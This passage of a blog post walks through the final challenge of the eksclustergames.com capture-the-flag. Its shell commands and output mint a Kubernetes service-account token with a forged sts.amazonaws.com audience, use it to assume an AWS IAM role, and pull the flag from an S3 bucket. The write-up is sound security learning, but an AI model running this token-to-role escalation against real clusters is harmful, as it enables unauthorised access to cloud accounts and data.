#F69D50\">❯</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">export</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">TOKEN=$(</span><span style=\"color: #F69D50\">kubectl</span><span style=\"color: #96D0FF\"> create token debug-sa)</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">❯</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">kubectl</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #6CB6FF\">--token</span><span style=\"color: #ADBAC7\"> $TOKEN </span><span style=\"color: #96D0FF\">auth</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">can-i</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #6CB6FF\">--list</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">warning:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">the</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">list</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">may</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">be</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">incomplete:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">webhook</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">authorizer</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">does</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">not</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">support</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">user</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">rule</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">resolution</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">Resources</span><span style=\"color: #ADBAC7\">                                       </span><span style=\"color: #96D0FF\">Non-Resource</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">URLs</span><span style=\"color: #ADBAC7\">                     </span><span style=\"color: #96D0FF\">Resource</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">Names</span><span style=\"color: #ADBAC7\">     </span><span style=\"color: #96D0FF\">Verbs</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">selfsubjectaccessreviews.authorization.k8s.io</span><span style=\"color: #ADBAC7\">   []                                    []                 [create]</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">selfsubjectrulesreviews.authorization.k8s.io</span><span style=\"color: #ADBAC7\">    []                                    []                 [create]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/.well-known/openid-configuration]   []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/api/</span><span style=\"color: #F47067\">*</span><span style=\"color: #ADBAC7\">]                              []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/api]                                []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/apis/</span><span style=\"color: #F47067\">*</span><span style=\"color: #ADBAC7\">]                             []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/apis]                               []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/healthz]                            []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/healthz]                            []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/livez]                              []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/livez]                              []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/openapi/</span><span style=\"color: #F47067\">*</span><span style=\"color: #ADBAC7\">]                          []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/openapi]                            []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/openid/v1/jwks]                     []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/readyz]                             []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/readyz]                             []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/version/]                           []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/version/]                           []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/version]                            []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                                                [/version]                            []                 [get]</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">podsecuritypolicies.policy</span><span style=\"color: #ADBAC7\">                      []                                    [eks.privileged]   [use]</span></span></code></pre></div>\n<p>Looks like we have less access than before.  So not too helpful, lets take a\nlook at that service account we want to become:</p>\n<div data-rehype-pretty-code-fragment=\"\"><pre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"><code data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"><span data-line=\"\"><span style=\"color: #F69D50\">❯</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">kubectl</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">get</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">sa</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">s3access-sa</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #6CB6FF\">-o</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">json</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">{</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    </span><span style=\"color: #F69D50\">\"apiVersion\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"v1\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    </span><span style=\"color: #F69D50\">\"kind\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"ServiceAccount\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    </span><span style=\"color: #F69D50\">\"metadata\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">{</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">        </span><span style=\"color: #F69D50\">\"annotations\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">{</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">            </span><span style=\"color: #F69D50\">\"eks.amazonaws.com/role-arn\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"arn:aws:iam::688655246681:role/challengeEksS3Role\"</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">        },</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">        </span><span style=\"color: #F69D50\">\"creationTimestamp\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"2023-10-31T20:07:34Z\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">        </span><span style=\"color: #F69D50\">\"name\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"s3access-sa\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">        </span><span style=\"color: #F69D50\">\"namespace\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"challenge5\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">        </span><span style=\"color: #F69D50\">\"resourceVersion\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"671916\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">        </span><span style=\"color: #F69D50\">\"uid\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"86e44c49-b05a-4ebe-800b-45183a6ebbda\"</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    }</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">}</span></span></code></pre></div>\n<p>I think we are going to need to use our AWS access to assume that role, I don't\nbelieve our kubernetes access is going to get us anywhere:</p>\n<div data-rehype-pretty-code-fragment=\"\"><pre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"><code data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"><span data-line=\"\"><span style=\"color: #F69D50\">❯</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">aws</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">sts</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">assume-role</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #6CB6FF\">--role-arn</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">arn:aws:iam::688655246681:role/challengeEksS3Role</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #6CB6FF\">--role-session-name</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">test</span></span>\n<span data-line=\"\"> </span>\n<span data-line=\"\"><span style=\"color: #F69D50\">An</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">error</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">occurred</span><span style=\"color: #ADBAC7\"> (AccessDenied) when calling the AssumeRole operation: User: arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282 is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::688655246681:role/challengeEksS3Role</span></span></code></pre></div>\n<p>Ok, so <em>maybe</em> our kubernetes access is important since we can't assume the role\ndirectly.   Lets try to use that $TOKEN from <code>debug-sa</code> to assume the role:</p>\n<div data-rehype-pretty-code-fragment=\"\"><pre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"><code data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"><span data-line=\"\"><span style=\"color: #F69D50\">❯</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">aws</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">sts</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">assume-role-with-web-identity</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #6CB6FF\">--role-arn</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">arn:aws:iam::688655246681:role/challengeEksS3Role</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #6CB6FF\">--role-session-name</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">test</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #6CB6FF\">--web-identity-token</span><span style=\"color: #ADBAC7\"> $TOKEN</span></span>\n<span data-line=\"\"> </span>\n<span data-line=\"\"><span style=\"color: #F69D50\">An</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">error</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">occurred</span><span style=\"color: #ADBAC7\"> (InvalidIdentityToken) when calling the AssumeRoleWithWebIdentity operation: Incorrect token audience</span></span></code></pre></div>\n<p>Getting closer!   The default audience for a token created with <code>kubectl</code> is\n<code>https://kubernetes.default.svc</code> which amazon doesn't seem to like.  Lets try\ncreating it again with <code>sts.amazonaws.com</code>:</p>\n<div data-rehype-pretty-code-fragment=\"\"><pre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"><code data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"><span data-line=\"\"><span style=\"color: #F69D50\">❯</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">export</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">TOKEN=$(</span><span style=\"color: #F69D50\">kubectl</span><span style=\"color: #96D0FF\"> create token debug-sa </span><span style=\"color: #6CB6FF\">--audience</span><span style=\"color: #96D0FF\"> sts.amazonaws.com)</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">❯</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">aws</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">sts</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">assume-role-with-web-identity</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #6CB6FF\">--role-arn</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">arn:aws:iam::688655246681:role/challengeEksS3Role</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #6CB6FF\">--role-session-name</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">test</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #6CB6FF\">--web-identity-token</span><span style=\"color: #ADBAC7\"> $TOKEN</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">{</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    </span><span style=\"color: #F69D50\">\"Credentials\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">{</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">        </span><span style=\"color: #F69D50\">\"AccessKeyId\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"ASIA2AVYNEV&#x3C;*REDACTED*>\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">        </span><span style=\"color: #F69D50\">\"SecretAccessKey\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"VTZ4TuDrtHGca&#x3C;*REDACTED*>\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">        </span><span style=\"color: #F69D50\">\"SessionToken\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"IQoJb3JpZ2luX2VjEAQaCXVzLXd+7ONV2wIgESXuf&#x3C;*REDACTED*>\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">        </span><span style=\"color: #F69D50\">\"Expiration\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"2023-11-03T05:09:07+00:00\"</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    },</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    </span><span style=\"color: #F69D50\">\"SubjectFromWebIdentityToken\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"system:serviceaccount:challenge5:debug-sa\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    </span><span style=\"color: #F69D50\">\"AssumedRoleUser\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">{</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">        </span><span style=\"color: #F69D50\">\"AssumedRoleId\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"AROA2AVYNEVMZEZ2AFVYI:test\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">        </span><span style=\"color: #F69D50\">\"Arn\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"arn:aws:sts::688655246681:assumed-role/challengeEksS3Role/test\"</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    },</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    </span><span style=\"color: #F69D50\">\"Provider\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"arn:aws:iam::688655246681:oidc-provider/oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    </span><span style=\"color: #F69D50\">\"Audience\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"sts.amazonaws.com\"</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">}</span></span></code></pre></div>\n<p>Success!  We have some new AWS credentials.  Lets setup our new AWS Session:</p>\n<div data-rehype-pretty-code-fragment=\"\"><pre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"><code data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"><span data-line=\"\"><span style=\"color: #F69D50\">❯</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">export</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">AWS_ACCESS_KEY_ID=\"ASIA2AVYNEV&#x3C;*REDACTED*>\"</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">❯</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">export</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">AWS_SECRET_ACCESS_KEY=\"VTZ4TuDrtHGca&#x3C;*REDACTED*>\"</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">❯</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">export</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">AWS_SESSION_TOKEN=\"IQoJb3JpZ2luX2VjEAQaCXVzLXd+7ONV2wIgESXuf&#x3C;*REDACTED*>\"</span></span>\n<span data-line=\"\"> </span>\n<span data-line=\"\"><span style=\"color: #F69D50\">❯</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">aws</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">sts</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">get-caller-identity</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">{</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    </span><span style=\"color: #F69D50\">\"UserId\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"AROA2AVYNEVMZEZ2AFVYI:test\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    </span><span style=\"color: #F69D50\">\"Account\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"688655246681\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    </span><span style=\"color: #F69D50\">\"Arn\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"arn:aws:sts::688655246681:assumed-role/challengeEksS3Role/test\"</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">}</span></span></code></pre></div>\n<p>We are now the new role!   We hopefully have access to S3 now.  At the start\nof the challenge it provided us a clue to what bucket we want to view by\nproviding us the IAM policy:</p>\n<div data-rehype-pretty-code-fragment=\"\"><pre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"json\" data-theme=\"default\"><code data-language=\"json\" data-theme=\"default\" style=\"display: grid;\"><span data-line=\"\"><span style=\"color: #ADBAC7\">{</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    </span><span style=\"color: #8DDB8C\">\"Policy\"</span><span style=\"color: #ADBAC7\">: {</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">        </span><span style=\"color: #8DDB8C\">\"Statement\"</span><span style=\"color: #ADBAC7\">: [</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">            {</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                </span><span style=\"color: #8DDB8C\">\"Action\"</span><span style=\"color: #ADBAC7\">: [</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                    </span><span style=\"color: #96D0FF\">\"s3:GetObject\"</span><span style=\"color: #ADBAC7\">,</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                    </span><span style=\"color: #96D0FF\">\"s3:ListBucket\"</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                ],</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                </span><span style=\"color: #8DDB8C\">\"Effect\"</span><span style=\"color: #ADBAC7\">: </span><span style=\"color: #96D0FF\">\"Allow\"</span><span style=\"color: #ADBAC7\">,</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                </span><span style=\"color: #8DDB8C\">\"Resource\"</span><span style=\"color: #ADBAC7\">: [</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                    </span><span style=\"color: #96D0FF\">\"arn:aws:s3:::challenge-flag-bucket-3ff1ae2\"</span><span style=\"color: #ADBAC7\">,</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                    </span><span style=\"color: #96D0FF\">\"arn:aws:s3:::challenge-flag-bucket-3ff1ae2/flag\"</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                ]</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">            }</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">        ],</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">        </span><span style=\"color: #8DDB8C\">\"Version\"</span><span style=\"color: #ADBAC7\">: </span><span style=\"color: #96D0FF\">\"2012-10-17\"</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    }</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">}</span></span></code></pre></div>\n<p>So we want to fetch <code>arn:aws:s3:::challenge-flag-bucket-3ff1ae2/flag</code>:</p>\n<div data-rehype-pretty-code-fragment=\"\"><pre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"><code data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"><span data-line=\"\"><span style=\"color: #F69D50\">❯</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">aws</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">s3</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">cp</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">s3://challenge-flag-bucket-3ff1ae2/flag</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">.</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">download:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">s3://challenge-flag-bucket-3ff1ae2/flag</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">to</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">./flag</span><span style=\"color: #ADBAC7\">       </span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">❯</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">cat</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">flag</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">wiz_eks_challenge</span><span style=\"color: #ADBAC7\">{w0w_y0u_really_are_4n_eks_and_aws&#x3C;*REDACTED*>}</span></span></code></pre></div>\n<p>and thats the final flag! In my next post I'll discuss the remediation steps\nto prevent this configuration mistakes on your cluster!</p>","category":"Kubernetes","date":"2023-11-02T00:00:00Z","tags":["Kubernetes","SRE","Security"],"title":"eksclustergames.com walk through!"}},"__N_SSG":true}